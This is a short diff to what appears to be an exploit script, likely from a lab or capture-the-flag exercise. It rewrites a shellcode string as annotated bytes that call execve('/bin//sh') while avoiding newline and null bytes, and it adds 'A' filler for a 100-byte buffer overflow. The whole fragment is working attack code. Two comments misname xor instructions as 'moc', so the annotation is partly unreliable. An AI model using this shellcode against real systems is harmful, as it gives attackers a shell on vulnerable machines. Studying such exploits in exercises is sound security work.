@@ -1,5 +1,15 @@
 # Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
-SHELLCODE = b"1\xc0P\x04\x0bh//shh/bin\x89\xe31\xc91\xd2\xcd\x80"
+SHELLCODE = (
+    b"\x31\xc0"  # xor eax, eax
+    + b"\x50"  # push eax (null terminator)
+    + b"\x04\x0b"  # add al, 11 (execve)
+    + b"\x68//sh"  # push "//sh"
+    + b"\x68/bin"  # push "/bin"
+    + b"\x89\xe3"  # mov ebx, esp (ebx points to "/bin//sh")
+    + b"\x31\xc9"  # moc ecx, ecx (argv = NULL)
+    + b"\x31\xd2"  # moc edx, edx (envp = NULL)
+    + b"\xcd\x80"  # int 0x80 (syscall)
+)
 
 ASTR_FILLER = b"A" * (100 - len(SHELLCODE))
 
